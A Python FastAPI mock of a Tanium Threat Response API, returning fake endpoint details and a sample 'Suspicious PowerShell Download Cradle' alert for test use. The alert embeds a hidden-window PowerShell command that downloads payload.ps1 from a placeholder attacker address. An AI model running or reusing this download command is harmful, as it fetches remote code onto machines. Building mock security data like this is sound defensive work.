from fastapi import APIRouter, Query

router = APIRouter(prefix="/api/v1/tanium", tags=["tanium"])


@router.get("/tanium_threat_response")
def tanium_threat_response():
    return {
        "data": {
            "endpoints": {
                "edges": [
                    {
                        "node": {
                            "id": "endpoint-123456",
                            "computerId": 123456,
                            "name": "WS-ACCT-0142",
                            "domainName": "CORP",
                            "ipAddress": "10.42.18.55",
                            "macAddress": "00:50:56:A1:B2:C3",
                            "operatingSystem": "Windows 11 Enterprise",
                            "osVersion": "10.0.22631",
                            "lastSeenAt": "2026-03-14T13:41:22Z",
                            "online": True,
                            "sensorHealth": "healthy",
                            "installedProducts": [
                                "Tanium Client",
                                "Threat Response"
                            ],
                            "tags": [
                                "Finance",
                                "Managed",
                                "Windows"
                            ]
                        }
                    }
                ]
            }
        }
    }


@router.get("/get_alerts")
def get_alerts(hostname: str = Query(...)):
    """
    Mock endpoint to simulate Tanium Threat Response alerts.
    Returns a sample alert for the given hostname."""
    return {
      "data": {
        "alerts": [
        {
          "Alert Id": "87421",
          "Computer Name": hostname,
          "Computer IP": "10.42.18.55",
          "Intel Id": "64",
          "Intel Name": "Suspicious PowerShell Download Cradle",
          "Intel Type": "signal",
          "Intel Labels": "Execution, PowerShell, Suspicious",
          "MITRE Techniques": [
              "T1059.001",
              "T1105"
          ],
          "Timestamp": "2026-03-14T13:41:58.000Z",
          "id": "6c2bb3f4-0b74-4c9e-a4f7-41d8d9c9f1e2",
          "params": [
              "powershell.exe",
              "Invoke-WebRequest",
              "http://10.51.100.25/payload.ps1"
          ],
          "MatchDetails": {
              "finding": {
                  "system_info": {
                      "platform": "windows",
                      "os": "Windows 11 Enterprise",
                      "patch_level": "22631",
                      "bits": "64"
                  }
              },
              "match": {
                  "properties": {
                      "pid": 6420,
                      "args": "powershell.exe -nop -w hidden -c Invoke-WebRequest http://198.51.100.25/payload.ps1",
                      "fullpath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                      "sha256": "2f2d5b0d1f9b7b9c6b8f6c86f06f7f9790d53031c1f2d33f8d3b1a0a6b4f8e71",
                      "user": "CORP\\jdoe",
                      "remote_ip": "198.51.100.25",
                      "remote_port": 80,
                      "protocol": "tcp",
                      "parent": {
                          "pid": 4012,
                          "args": "cmd.exe /c powershell.exe ...",
                          "file": {
                              "fullpath": "C:\\Windows\\System32\\cmd.exe",
                              "md5": "d41d8cd98f00b204e9800998ecf8427e"
                          }
                      }
                  }
              }
            }
          }
        ]
      }
    }
